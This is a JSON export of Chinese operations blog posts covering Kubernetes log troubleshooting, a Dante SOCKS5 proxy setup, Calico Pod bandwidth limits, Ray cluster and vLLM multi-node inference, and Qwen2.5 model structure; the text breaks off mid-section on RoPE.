[{"content":"1. 现象 能查看 Pod 的信息 1 2 3 4 kubectl -n my-testns get pod my-testpod NAME READY STATUS RESTARTS AGE my-testpod 1/1 Running 0 2d13h 不能查看 Pod 的日志 1 2 3 kubectl -n my-testns logs my-testpod -f Error from server (NotFound): the server could not find the requested resource ( pods/log my-testpod) 在 Pod 所在主机上可以通过 docker logs 查看容器日志。\n测试 Kubelet 的健康状态 OK 1 curl -k https://x.x.x.x:10250/healthz 这里要使用主机的 IP 地址，kubectl logs 命名会直接调用 Kubelet 的 API 获取容器日志。\n不能 exec 到 Pod 中 1 2 3 kubectl -n my-testns exec -it my-testpod -- bash Error from server: 没有详细输出错误详情。\nkube-apiserver 中没有相关的错误日志 1 kubectl -n kube-system logs -l component=kube-apiserver -f top 节点无法查看 Metrics 1 2 3 kubectl top node node-3 Error from server (NotFound): nodemetrics.metrics.k8s.io \u0026#34;node-3\u0026#34; not found 1 2 3 4 5 6 7 kubectl top node node-03 246m 0% 4921Mi 7% node-11 1929m 1% 152378Mi 14% node-26 \u0026lt;unknown\u0026gt; \u0026lt;unknown\u0026gt; \u0026lt;unknown\u0026gt; \u0026lt;unknown\u0026gt; node-28 \u0026lt;unknown\u0026gt; \u0026lt;unknown\u0026gt; \u0026lt;unknown\u0026gt; \u0026lt;unknown\u0026gt; node-01 \u0026lt;unknown\u0026gt; \u0026lt;unknown\u0026gt; \u0026lt;unknown\u0026gt; \u0026lt;unknown\u0026gt; 无法查看 Metrics Server Pod 所在节点的指标，有时部分可以。\nMetrics Server 容器异常报错 1 E0221 06:27:28.020225 1 scraper.go:149] \u0026#34;Failed to scrape node\u0026#34; err=\u0026#34;request failed, status: \\\u0026#34;403 Forbidden\\\u0026#34;\u0026#34; node=\u0026#34;node-01\u0026#34; 2. 解决办法 在 Kubelet 中添加 node-ip 1 vim /var/lib/kubelet/kubeadm-flags.env 添加 --node-ip=x.x.x.x，然后重启 kubelet，这里的 x.x.x.x 是主机的 IP 地址。\n这种方式是 Issues 提到的解决办法，但是对于我们无效。\n删掉问题节点上的 Metrics Server 能够临时解决问题，Metrics Server 会重新部署到其他节点上导致出现类似的问题。\n修改 Metrics Server 的版本 在 Kubernetes 1.25.6、Docker 20.10.7 上，将 Metrics Server 从 0.7.1 降级到 0.6.2 之后恢复，应该是 Metrics Server 的高版本对 Docker 的兼容性问题。\n3. 参考 https://github.com/kubernetes/kubernetes/issues/125783 ","description":"","id":0,"section":"post","tags":["博文","Kubernetes","kubectl","Pod","运维故障"],"title":"kubectl logs 无法查看 Pod 日志报错 NotFound","uri":"https://www.chenshaowen.com/blog/kubectl-logs-not-found-error.html"},{"content":" 由于机房服务器绑定的带宽较小，本篇主要是借助 Dante 提供 SOCKS5 代理服务，借助一些大带宽的服务器进行流量转发，用以加快依赖包的下载速度。\n1. 找一台大带宽的代理服务器 安装 speedtest-cli 1 pip3 install speedtest-cli 列出对端测试服务器 1 2 3 4 5 6 7 8 9 10 11 12 13 speedtest-cli --secure --list Retrieving speedtest.net configuration... 5396) China Telecom JiangSu 5G (Suzhou, China) [747.08 km] 16204) JSQY - Suzhou (Suzhou, China) [747.08 km] 4575) China Mobile Group Sichuan (Chengdu, China) [1012.06 km] 17634) China Mobile (Fujian, China) [1102.09 km] 67564) MOACK Data Center (Yongin-si, South Korea) [1240.80 km] 62580) Skymedia (Ulaanbaatar, Mongolia) [1566.70 km] 3805) Alyans Telekom (Vladivostok, Russia) [1822.03 km] 27732) Telenet-Chita (Chita, Russia) [1921.20 km] 36254) EDINOS (Ulan-Ude, Russia) [1959.23 km] 37436) RLINE1 (Svobodny, Russia) [2177.33 km] 第一列就是我们需要的测试服务器的 ID\n测试速度 国内\n1 speedtest-cli --secure --server 5396 海外\n1 speedtest-cli --secure --server 37436 2. 部署 Dante 服务端 安装 dante 1 apt install dante-server -y 生成配置文件 1 ip route | grep default | awk \u0026#39;{print $5}\u0026#39; 找到默认网卡的名称，这里是 bond0\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 cat \u0026gt; /etc/danted.conf \u0026lt;\u0026lt;EOF logoutput: syslog internal: 0.0.0.0 port = 1080 external: bond0 method: username none user.privileged: root user.unprivileged: nobody client pass { from: 0.0.0.0/0 to: 0.0.0.0/0 log: connect } socks pass { from: 0.0.0.0/0 to: 0.0.0.0/0 log: connect } EOF 启动服务 1 2 systemctl restart danted systemctl enable danted 3. 配置客户端 配置代理 1 export ALL_PROXY=\u0026#34;socks5://x.x.x.x:1080\u0026#34; 测试代理 1 curl ifconfig.me 此时应该输出上面代理服务器的 IP 地址。\n清理代理 1 unset ALL_PROXY ","description":"","id":1,"section":"post","tags":["博文","Dante","运维","带宽"],"title":"使用 Dante 提供 SOCKS5 代理服务","uri":"https://www.chenshaowen.com/blog/dante-socks5-proxy.html"},{"content":"1. 测试全部带宽 在目标主机上启动 iperf3 服务端 1 2 3 4 5 iperf3 -s ----------------------------------------------------------- Server listening on 5201 ----------------------------------------------------------- 在客户端主机上测试 1 iperf3 -c x.x.x.x -p 5201 -t 10 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 Connecting to host x.x.x.x, port 5201 [ ID] Interval Transfer Bitrate Retr Cwnd [ 5] 0.00-1.00 sec 151 MBytes 1.27 Gbits/sec 3562 164 KBytes [ 5] 1.00-2.00 sec 134 MBytes 1.12 Gbits/sec 230 164 KBytes [ 5] 2.00-3.00 sec 124 MBytes 1.04 Gbits/sec 250 213 KBytes [ 5] 3.00-4.00 sec 122 MBytes 1.03 Gbits/sec 229 195 KBytes [ 5] 4.00-5.00 sec 122 MBytes 1.03 Gbits/sec 342 198 KBytes [ 5] 5.00-6.00 sec 125 MBytes 1.05 Gbits/sec 351 212 KBytes [ 5] 6.00-7.00 sec 124 MBytes 1.04 Gbits/sec 319 220 KBytes [ 5] 7.00-8.00 sec 121 MBytes 1.02 Gbits/sec 286 220 KBytes [ 5] 8.00-9.00 sec 125 MBytes 1.05 Gbits/sec 233 191 KBytes [ 5] 9.00-10.00 sec 122 MBytes 1.03 Gbits/sec 377 192 KBytes - - - - - - - - - - - - - - - - - - - - - - - - - [ ID] Interval Transfer Bitrate Retr [ 5] 0.00-10.00 sec 1.24 GBytes 1.07 Gbits/sec 6179 sender [ 5] 0.00-10.00 sec 1.24 GBytes 1.06 Gbits/sec receiver 这说明两台主机之间的带宽是 1 Gbps 。\n2. 确认 Calico 已经开启 Bandwidth 插件 在 Calico 的 ConfigMap 配置文件中应该可以看到 Bandwidth 插件 1 kubectl -n calico-system get cm cni-config -o yaml 1 2 3 4 { \u0026#34;type\u0026#34;: \u0026#34;bandwidth\u0026#34;, \u0026#34;capabilities\u0026#34;: {\u0026#34;bandwidth\u0026#34;: true} }, 在主机上可以看到 calico-bandwidth 的插件 1 cat /etc/cni/net.d/10-calico.conflist 1 2 3 4 { \u0026#34;type\u0026#34;: \u0026#34;bandwidth\u0026#34;, \u0026#34;capabilities\u0026#34;: {\u0026#34;bandwidth\u0026#34;: true} }, 3. 创建带宽受限的 Pod 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - apiVersion: apps/v1 kind: Deployment metadata: name: test-rate-limit namespace: default spec: replicas: 1 selector: matchLabels: app: test-rate-limit template: metadata: labels: app: test-rate-limit annotations: kubernetes.io/egress-bandwidth: \u0026#34;1M\u0026#34; kubernetes.io/ingress-bandwidth: \u0026#34;1M\u0026#34; spec: containers: - name: main image: registry.cn-beijing.aliyuncs.com/shaowenchen/demo-iperf3:latest ports: - containerPort: 80 EOF 这里的 M 单位是 Mbps，所以这里设置的是 1 Mbps 的带宽。\nkubernetes.io/egress-bandwidth 表示的是 Pod 的出口带宽，也就是其他应用访问这个 Pod 的带宽。\nkubernetes.io/ingress-bandwidth 表示的是 Pod 的入口带宽，也就是这个 Pod 访问其他应用的带宽。\n4. 在 Pod 中测试带宽 在容器中启动客户端 1 kubectl exec deployment/test-rate-limit -- bash -c \u0026#34;iperf3 -c x.x.x.x -p 5201 -t 10\u0026#34; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 Connecting to host x.x.x.x, port 5201 [ 5] local 10.244.101.19 port 60566 connected to x.x.x.x port 5201 [ ID] Interval Transfer Bitrate Retr Cwnd [ 5] 0.00-1.00 sec 8.81 MBytes 73.9 Mbits/sec 0 382 KBytes [ 5] 1.00-2.00 sec 0.00 Bytes 0.00 bits/sec 0 388 KBytes [ 5] 2.00-3.00 sec 0.00 Bytes 0.00 bits/sec 0 395 KBytes [ 5] 3.00-4.00 sec 816 KBytes 6.68 Mbits/sec 0 395 KBytes [ 5] 4.00-5.00 sec 0.00 Bytes 0.00 bits/sec 0 395 KBytes [ 5] 5.00-6.00 sec 0.00 Bytes 0.00 bits/sec 0 395 KBytes [ 5] 6.00-7.00 sec 0.00 Bytes 0.00 bits/sec 0 395 KBytes [ 5] 7.00-8.00 sec 0.00 Bytes 0.00 bits/sec 0 395 KBytes [ 5] 8.00-9.00 sec 0.00 Bytes 0.00 bits/sec 0 395 KBytes [ 5] 9.00-10.00 sec 0.00 Bytes 0.00 bits/sec 0 395 KBytes - - - - - - - - - - - - - - - - - - - - - - - - - [ ID] Interval Transfer Bitrate Retr [ 5] 0.00-10.00 sec 9.61 MBytes 8.06 Mbits/sec 0 sender [ 5] 0.00-10.11 sec 8.03 MBytes 6.67 Mbits/sec receiver 将 kubernetes.io/egress-bandwidth 设置为 100M 1 kubectl exec deployment/test-rate-limit -- bash -c \u0026#34;iperf3 -c x.x.x.x -p 5201 -t 10\u0026#34; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 Connecting to host x.x.x.x, port 5201 [ 5] local 10.244.101.50 port 34504 connected to x.x.x.x port 5201 [ ID] Interval Transfer Bitrate Retr Cwnd [ 5] 0.00-1.00 sec 127 MBytes 1.06 Gbits/sec 2262 1.37 KBytes [ 5] 1.00-2.00 sec 124 MBytes 1.04 Gbits/sec 2423 198 KBytes [ 5] 2.00-3.00 sec 25.0 MBytes 210 Mbits/sec 26 177 KBytes [ 5] 3.00-4.00 sec 11.2 MBytes 94.4 Mbits/sec 0 177 KBytes [ 5] 4.00-5.00 sec 11.2 MBytes 94.4 Mbits/sec 0 177 KBytes [ 5] 5.00-6.00 sec 11.2 MBytes 94.4 Mbits/sec 0 177 KBytes [ 5] 6.00-7.00 sec 12.5 MBytes 105 Mbits/sec 0 177 KBytes [ 5] 7.00-8.00 sec 11.2 MBytes 94.4 Mbits/sec 0 177 KBytes [ 5] 8.00-9.00 sec 11.2 MBytes 94.4 Mbits/sec 0 177 KBytes [ 5] 9.00-10.00 sec 11.2 MBytes 94.4 Mbits/sec 0 177 KBytes - - - - - - - - - - - - - - - - - - - - - - - - - [ ID] Interval Transfer Bitrate Retr [ 5] 0.00-10.00 sec 355 MBytes 298 Mbits/sec 4711 sender [ 5] 0.00-10.01 sec 352 MBytes 295 Mbits/sec receiver iperf3 测试持续的时间越长，带宽值越稳定，越接近设置的限制值。\n5. 总结 在集群除了 CPU、Memory 之外，IO 中的带宽也是受限资源，特别是在高密度部署的集群中，时常会因为带宽抢占，导致服务的延时增加。\n本篇主要是介绍了如何使用 Calico 的 Bandwidth 插件来限制 Pod 的带宽，通过设置 kubernetes.io/egress-bandwidth 和 kubernetes.io/ingress-bandwidth 来限制 Pod 的出口和入口带宽。\n值得注意的是，虽然对 Pod 的带宽进行了限制，在并不是实时有效，在流量发起时，可能会出现瞬时的带宽超限情况，但是随着时间的推移，带宽会逐渐稳定在限制值附近。\n另外在测试过程还发现，如果 Pod 使用了 HostNetwork，那么设置的带宽限制是无效的，这是因为 HostNetwork 的 Pod 是直接使用主机的网络资源，所以无法通过 Calico 的 Bandwidth 插件来限制。\n","description":"","id":2,"section":"post","tags":["博文","Calico","Pod","带宽","限制"],"title":"使用 Calico 限制 Pod 的带宽","uri":"https://www.chenshaowen.com/blog/using-calico-to-limit-pod-bandwidth.html"},{"content":"1. 什么是 Ray 2016 年，UC Berkeley 的 RISELab 发布了一个新的分布式计算框架 Ray。\n2017 年，发布 Ray 相关论文之后，受到业内的广泛关注，国内主要是蚂蚁集团采用并贡献了 Ray。\n2020 年，Ray 发布了 1.0 版本，引入 Placement Group 特性，增加了用户自定义任务编排的灵活性，为后续的 Ray AI Libraries 和 vLLM 等项目提供了基础支持。\n2021 年，Ray 发布了 1.5 版本，发布 Ray Data Alpha，弥补了 Ray 在 AI 数据处理和离线推理领域的空白，后续在 AI 数据处理方面得到广泛应用。\n2022 年，Ray 发布了 2.0 版本，引入 Ray AIR（Ray AI Runtime）概念，聚焦 AI 生态，使用户能够基于此快速构建 AI 基建。\n2023 年，Ray 发布了 2.9 版本，引入 Streaming Generator，原生支持流式推理能力，更好地适配大模型场景。大模型推理引擎 vLLM 基于 Ray Core 及 Ray Serve 构建分布式推理能力，进一步丰富了 Ray 的 AI 生态。\n2024 年，Ray 发布了 Ray 2.32 版本，引入 Ray DAG，更好地支持 AI 场景下异构设备间的通信，持续推动 Ray 在分布式计算尤其是 AI 领域的应用和发展。\n目前 Ray 最新的版本是 2.42.0。\n2. Ray 的架构 2.1 架构图 如上图，Ray 是由 Ray Core 和 Ray AI Libraries 两部分组成的。\n2.2 Ray Core Ray Core 是 Ray 的核心组件，提供了任务调度、状态管理和数据传输等能力。\n其核心有三个部分：\nTasks Tasks 是 Ray 中并行计算的基本单元。Tasks 会被分发到不同的节点上执行，执行完毕后会将结果返回给调用方。\nActors Actors 是 Ray 中带有状态的计算单元，用来维护任务之间的中间状态，适合需要长期运行或者有状态的计算。\nObjects Objects 是 Ray 中数据单元，用来在不同节点之间传递数据，保存中间结果，简化任务之间的数据传递。\n2.3 Ray AI Libraries 基于 Ray Core 提供的在分布式场景下，对计算、状态和数据的管理能力，Ray AI Libraries 提供了一系列 AI 相关的库，通过这些库可以更方便的对接各种分布式计算场景。\nData 可扩展的、与框架无关的数据加载和转换，涵盖训练、调优和预测。\nTrain 用于分布式训练\nTune 可扩展的超参数调优，以优化模型性能\nRLlib 可扩展的强化学习工作负载\nServe 可扩展和可编程的服务，用于部署用于在线推理的模型，并可选择微批处理来提高性能。\n3. 组建 Ray Cluster 组件 Ray Cluster 时，需要选择一台节点作为 Head Node 控制节点，其他节点作为 Worker Node 工作节点。\n3.1 安装 Ray 1 pip install ray==2.42.0 需要注意，保持 Head Node 和 Worker Node 的 Python、Ray 版本一致。\n3.2 启动 Head Node 1 ray start --head --port=6379 启动之后会输出 Local node IP。此时可以查看 ray 的状态\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ray status Node status --------------------------------------------------------------- Active: 1 node_6059a3f888076423cb58ef7138d24e40b4e8c114784adcfaef92a407 Pending: (no pending nodes) Recent failures: (no failures) Resources --------------------------------------------------------------- Usage: 0.0/32.0 CPU 0.0/4.0 GPU 0B/141.39GiB memory 0B/64.59GiB object_store_memory Demands: (no resource demands) 3.3 启动 Worker Node 设置 Head Node 的 IP\n1 export RAY_HEAD_IP=x.x.x.x 检测网络连通性\n1 nc -zv ${RAY_HEAD_IP} 6379 启动 Worker Node\n1 ray start --address=${RAY_HEAD_IP}:6379 3.4 在任意节点查看 Ray Cluster 状态 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 ray status Node status --------------------------------------------------------------- Active: 1 node_99586ba71470c3b36fca67056ccd507cc760f39ef1bdd747a28afd2d 1 node_6059a3f888076423cb58ef7138d24e40b4e8c114784adcfaef92a407 Pending: (no pending nodes) Recent failures: (no failures) Resources --------------------------------------------------------------- Usage: 0.0/64.0 CPU 0.0/8.0 GPU 0B/298.09GiB memory 0B/131.74GiB object_store_memory Demands: (no resource demands) 此时可以看到 Ray Cluster 已经叠加了两个节点计算和存储资源，也包括 GPU 卡。\n4. 测试 Ray Cluster 编写一个简单的任务 将以下代码保存为 ray_test.py。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 import ray import itertools ray.init(address=\u0026#34;auto\u0026#34;) @ray.remote def map_task(data_chunk): \u0026#34;\u0026#34;\u0026#34;模拟计算：对数据块中的元素平方\u0026#34;\u0026#34;\u0026#34; return [x * x for x in data_chunk] @ray.remote def reduce_task(results): \u0026#34;\u0026#34;\u0026#34;模拟 Reduce 任务：对所有结果求和\u0026#34;\u0026#34;\u0026#34; # 展开所有列表并求和 return sum(itertools.chain(*results)) # 模拟数据分块 data = list(range(1000)) chunk_size = 200 data_chunks = [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)] # 提交 Map 任务 map_results = [map_task.remote(chunk) for chunk in data_chunks] # 解析 map 结果 map_values = ray.get(map_results) # 提交 Reduce 任务 final_result = reduce_task.remote(map_values) print(\u0026#34;Final distributed computation result:\u0026#34;, ray.get(final_result)) 运行任务 1 python3 ray_test.py 1 2 3 2025-02-09 11:39:15,281 INFO worker.py:1567 -- Connecting to existing Ray cluster at address: x.x.x.x:6379... 2025-02-09 11:39:15,288 INFO worker.py:1752 -- Connected to Ray cluster. Final distributed computation result: 332833500 5. vLLM 多机推理 vLLM 官方文档有一个 Docker 的示例， https://docs.vllm.ai/en/latest/serving/distributed_serving.html 。\nRay 官方文档也有一个 vLLM 的示例， https://docs.ray.io/en/latest/serve/tutorials/vllm-example.html 。\nKubernetes 官方文档也有一个 vLLM 的示例 https://github.com/kubernetes-sigs/lws/tree/main/docs/examples/vllm 。\n上面文档描述的都是基于 Ray 的多卡多机示例。这里直接在主机节点上进行测试，以便于后续针对不同运行时环境进行适配调整。\nRay Cluster 启动之后，只需要认为当前主机拥有全部 GPU 资源一样，启动 vLLM 服务即可。常见的多卡推理有两种方式，一种是 Tensor Parallel，一种是 Pipeline Parallel。\n安装依赖 1 pip install vllm 指定卡间通信的网络接口 多机推理场景下，保障节点之间的高效通信至关重要，可以通过设置 NCCL_SOCKET_IFNAME 环境变量来指定卡间通信的网络接口。\n1 2 export NCCL_SOCKET_IFNAME=eth0 export NCCL_DEBUG=TRACE 有些卡可能需要设置\n1 export GLOO_SOCKET_IFNAME=eth0 启动 vLLM 服务 1 2 3 4 5 6 7 8 python3 -m vllm.entrypoints.openai.api_server \\ --tensor-parallel-size 2 \\ --model /data/ops/Qwen2.5-0.5B \\ --served-model-name Qwen2.5-0.5B \\ --trust-remote-code \\ --dtype=half \\ --host 0.0.0.0 \\ --port 30000 在启动日志中，可以 vLLM 发现了 Ray Cluster，这里也可以使用 --pipeline-parallel-size 2 对模型进行切分。\n测试 vLLM 服务 1 2 3 4 5 6 7 8 9 curl http://127.0.0.1:30000/v1/chat/completions \\ -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{ \u0026#34;model\u0026#34;: \u0026#34;Qwen2.5-0.5B\u0026#34;, \u0026#34;messages\u0026#34;: [ {\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;介绍一下 Ray 计算引擎\u0026#34;} ], \u0026#34;max_tokens\u0026#34;: 1024 }\u0026#39; 6. 总结 本篇主要是介绍了 Ray 的基本概念和架构，以及如何搭建 Ray Cluster，最后通过一个简单的任务和 vLLM 示例来展示 Ray 的多机推理大模型使用。\nRay 的组网与之前的 MPI 通信原语及 Python 编程使用 有些类似，可能分布式场景下的计算和通信模式基本一致。\n","description":"","id":3,"section":"post","tags":["博文","分布式","计算框架","Ray","训练","推理"],"title":"分布式计算框架 Ray","uri":"https://www.chenshaowen.com/blog/what-is-ray.html"},{"content":"1. Qwen 模型介绍 2023 年 4 月，阿里巴巴推出 Qwen 的测试版。\n2023 年 12 月，阿里巴巴开源了 Qwen 的第一个版本。\n2024 年 9 月，阿里巴巴发布了 Qwen2.5。\n2025 年 1 月，阿里巴巴发布了 Qwen 2.5-Max。\nQwen 2.5 是 Qwen 大语言模型的目前最新系列。之所以说是系列，是因为在训练完一个预训练模型之后，为了最大化模型的价值，我们会针对业务场景和资源需求，对模型进行微调、蒸馏、裁剪、量化，得到不同的模型，以达到不同用途下性能和资源消耗的平衡。\n除了基座模型，Qwen2.5 还发布有对数学、编程、指令微调的版本；参数规模从 0.5 B 到 72 B 不等；还有 Int4、Int8 的量化版本。\nQwen 系列大模型在各种榜单上都取得了很好的成绩，在我们的生产环境中，也有部分业务使用的就是基于 Qwen 进行微调的模型。\n2. 准备环境 下载 Miniforge 1 wget \u0026#34;https://github.com/conda-forge/miniforge/releases/latest/download/Miniforge3-$(uname)-$(uname -m).sh\u0026#34; 安装 Miniforge 1 bash Miniforge3-$(uname)-$(uname -m).sh 配置变量 1 2 echo \u0026#34;export PATH=$HOME/miniforge3/bin:$PATH\u0026#34; \u0026gt;\u0026gt; ~/.bashrc source ~/.bashrc 创建环境 1 conda create -n qwen python=3.12 激活环境 1 conda activate qwen 下载模型 1 git lfs clone https://huggingface.co/Qwen/Qwen2.5-0.5B 查看文件 1 2 3 4 5 6 7 8 9 10 11 12 tree Qwen2.5-0.5B . ├── config.json ├── generation_config.json ├── LICENSE ├── merges.txt ├── model.safetensors ├── README.md ├── tokenizer_config.json ├── tokenizer.json └── vocab.json 安装依赖包 1 conda install transformers pytorch torchvision torchaudio pytorch-cuda=12.1 -c pytorch -c nvidia 3. 查看模型结构 指定使用的显卡号 1 export CUDA_VISIBLE_DEVICES=0 进入 IPython 环境 1 conda install ipython 1 ipython 查看模型结构 1 2 3 4 from transformers import AutoModelForCausalLM model = AutoModelForCausalLM.from_pretrained(\u0026#34;./Qwen2.5-0.5B\u0026#34;) print(model) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 Qwen2ForCausalLM( # 这是一个 CausalLM 模型 (model): Qwen2Model( (embed_tokens): Embedding(151936, 896) # 表示输入的词嵌入层，输入的词表大小为 151936，输出的维度为 896 (layers): ModuleList( # 一共有 24 层 decoder 层 (0-23): 24 x Qwen2DecoderLayer( # 自注意力层 (self_attn): Qwen2Attention( # QKV 矩阵的维度, 输出维度为 896 (q_proj): Linear(in_features=896, out_features=896, bias=True) (k_proj): Linear(in_features=896, out_features=128, bias=True) (v_proj): Linear(in_features=896, out_features=128, bias=True) (o_proj): Linear(in_features=896, out_features=896, bias=False) ) # 前馈网络层，这里由 MLP 构成， (mlp): Qwen2MLP( # 门控线性层 (gate_proj): Linear(in_features=896, out_features=4864, bias=False) # 上游投影 (up_proj): Linear(in_features=896, out_features=4864, bias=False) # 下游投影 (down_proj): Linear(in_features=4864, out_features=896, bias=False) # 激活函数shi (act_fn): SiLU() ) # 多头注意力，输入特征维度为 896 (input_layernorm): Qwen2RMSNorm((896,), eps=1e-06) # 对多头注意力输出特征进行归一化处理 (post_attention_layernorm): Qwen2RMSNorm((896,), eps=1e-06) ) ) # 归一化处理，为下一层的输入做准备 (norm): Qwen2RMSNorm((896,), eps=1e-06) # 位置编码，将位置信息加入到特征向量中 (rotary_emb): Qwen2RotaryEmbedding() ) # 线性层，将特征向量映射到词表大小 (lm_head): Linear(in_features=896, out_features=151936, bias=False) ) 查看模型参数量 1 2 num_params = sum(p.numel() for p in model.parameters()) print(f\u0026#34;模型参数总量: {num_params / 1e9:.5f} B\u0026#34;) 1 模型参数总量: 0.49403 B 查看模型参数 1 2 3 4 from transformers import AutoConfig config = AutoConfig.from_pretrained(\u0026#34;./Qwen2.5-0.5B\u0026#34;) print(config) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 Qwen2Config { \u0026#34;_name_or_path\u0026#34;: \u0026#34;./Qwen2.5-0.5B\u0026#34;, \u0026#34;architectures\u0026#34;: [ \u0026#34;Qwen2ForCausalLM\u0026#34; ], \u0026#34;attention_dropout\u0026#34;: 0.0, \u0026#34;bos_token_id\u0026#34;: 151643, \u0026#34;eos_token_id\u0026#34;: 151643, \u0026#34;hidden_act\u0026#34;: \u0026#34;silu\u0026#34;, \u0026#34;hidden_size\u0026#34;: 896, \u0026#34;initializer_range\u0026#34;: 0.02, \u0026#34;intermediate_size\u0026#34;: 4864, \u0026#34;max_position_embeddings\u0026#34;: 32768, \u0026#34;max_window_layers\u0026#34;: 24, \u0026#34;model_type\u0026#34;: \u0026#34;qwen2\u0026#34;, \u0026#34;num_attention_heads\u0026#34;: 14, \u0026#34;num_hidden_layers\u0026#34;: 24, \u0026#34;num_key_value_heads\u0026#34;: 2, \u0026#34;rms_norm_eps\u0026#34;: 1e-06, \u0026#34;rope_scaling\u0026#34;: null, \u0026#34;rope_theta\u0026#34;: 1000000.0, \u0026#34;sliding_window\u0026#34;: null, \u0026#34;tie_word_embeddings\u0026#34;: true, \u0026#34;torch_dtype\u0026#34;: \u0026#34;bfloat16\u0026#34;, \u0026#34;transformers_version\u0026#34;: \u0026#34;4.48.1\u0026#34;, \u0026#34;use_cache\u0026#34;: true, \u0026#34;use_mrope\u0026#34;: false, \u0026#34;use_sliding_window\u0026#34;: false, \u0026#34;vocab_size\u0026#34;: 151936 } 其中，\nmax_position_embeddings 表示模型支持的最大序列长度为 32768。\nnum_attention_heads 表示多头注意力的头数，num_key_value_heads 表示表示用于 key 和 value 的独立部分数量， num_attention_heads / num_key_value_heads 就是每个 key-value 组中包含多少个注意力头。\ntorch_dtype 表示模型的数据类型，bfloat16 表示半精度浮点数\nvocab_size 表示词表大小为 151936。\n4. 哪些因素决定模型的参数量 这里有一个估算模型参数量的公式：\n参数量 ≈ (隐藏层大小的平方 × 4 + 隐藏层大小 × 中间层大小) × 隐藏层层数 + 词汇表大小 × 隐藏层大小\n下面是一些典型的模型结构参数：\n模型名称 参数量 隐藏层维度 层数 注意力头数 Qwen-0.5B ~0.5B 896 24 14 Llama-7B 7B 4096 32 32 Llama-13B 13B 5120 40 40 Yi-34B 34B 7168 60 56 Llama-65B 65B 8192 80 64 DeepSeek-67B 67B 8192 80 64 5. 为什么需要 Embedding 层 有两个问题：\n1，为什么要进行这样的变换\n计算机能够有效处理的是数值型连续数据，而离散的词汇（如单词、字符、标记等）无法直接输入到神经网络中进行计算。\nEmbedding 层将离散的词汇（如单词、字符、标记等）转换为连续的、低维的向量表示的一层。\n2，为什么是这样的变换\n传统的独热编码（One-Hot Encoding）等方式，会导致向量维度极高且稀疏，存在计算量大、过拟合、表达能力差等问题。\n在训练时，Embedding 层的向量表示可以捕捉到单词之间的语义相似性。\n举个例子，[\u0026ldquo;狗\u0026rdquo;, \u0026ldquo;猫\u0026rdquo;, \u0026ldquo;鱼\u0026rdquo;]，对应的索引分别是 [0, 1, 2]，词表大小为 3。假设，隐藏层大小为 3，Embedding 层的输出是一个 3x3 的矩阵，每一行对应一个词的嵌入向量。\n输入：[0, 1, 2]，输出：\n1 2 3 4 5 [ [0.1, 0.3, 0.5], # 对应 \u0026#34;狗\u0026#34; 的嵌入向量 [0.2, 0.4, 0.6], # 对应 \u0026#34;猫\u0026#34; 的嵌入向量 [0.3, 0.5, 0.7] # 对应 \u0026#34;鱼\u0026#34; 的嵌入向量 ] 这里也可以看到 Embedding 层大小 = 词表大小 × 隐藏层大小\n在训练的过程中，Embedding 层的参数会随着模型的训练而不断调整，使得模型能够更好地捕捉到词汇之间的语义相似性。\n6. 什么是 CausalLM 模型 CausalLM (Causal Language Model，因果语言模型）是一种自回归语言模型，生成文本时，只依赖于已经生成的文本，不依赖于未来的文本。\nCaualLM 模型通常采用的是 Decoder-only 的 Transformer 架构，即只有解码器部分，没有编码器部分。\nEncoder, 编码器 编码器提取输入序列的特征，得到一个固定长度的向量表示。编码器通常采用双向注意力机制，能够关注到整个序列的信息。\nDecoder, 解码器 解码器会根据已经生成的输出元素以及上下文向量来预测下一个输出元素，直到达到预设的终止标记。解码器通常采用单向注意力机制，只能关注到已经生成的部分序列。\n6.1 Encoder-Olny Encoder-Only 模型只包含编码器，没有解码器，只能看到输入序列，不能利用已经生成的序列。\n通常用于特征提取、文本分类等任务。\n6.2 Encoder-Decoder Encoder-Decoder 模型是既包含编码器，也包含解码器，能够看到输入序列和输出序列。\n通常用于序列到序列的任务，如机器翻译、文本摘要等。\n6.3 Decoder-Only Decoder-Only 模型只包含解码器，没有编码器，只能看到已经生成的序列。\n通常用于 GPT 等任务，如文本生成、对话生成等。掩码机制，保障了解码器只能看到已经生成的序列，而不能看到未来的序列。\n下图是一个典型的 Decoder-Only 模型的结构：\n7. 前馈网络层的作用 Qwen2MLP 作为 Transformer 架构里编码器或解码器模块中的前馈网络层，它的作用是在多头自注意力机制处理完序列信息之后，进一步对特征进行非线性变换和信息整合。\n前馈网络层通常是由以下两个主要步骤组成:\n线性变换，对输入进行加权处理 可以用公式 y=Wx+b 表示，其中 W 是权重矩阵，b 是偏置向量，x 是输入向量，y 是输出向量。\n非线性激活函数，增加模型的表达能力 可以用公式 y=f(Wx+b) 表示，其中 f 是激活函数，用来控制神经元的激活程度。\n常用激活函数有 ReLU、GELU、SiLU 等。\n在训练过程中，前馈网络层需要不断地调整权重矩阵 W 和偏置向量 b，使得模型能够更好地拟合训练数据。\n8. RMSNorm 归一化的作用 有两个问题：\n为什么要进行归一化 通过归一化来去除输入的尺度差异，减少输入的变化范围，这有助于模型在训练过程中更容易收敛\n为什么使用 RMSNorm RMSNorm 是一种新型的归一化方法，它是一种基于均方根的归一化方法，与 BatchNorm、LayerNorm 等传统归一化方法相比，主要的优点是不用计算样本的均值，速度提升了 40%。\n9. RoPE 旋转位置编码 纯粹的 Attention 模块是无法捕捉输入顺序的，即无法理解不同位置的 token 代表的意义不同。\nRoPE 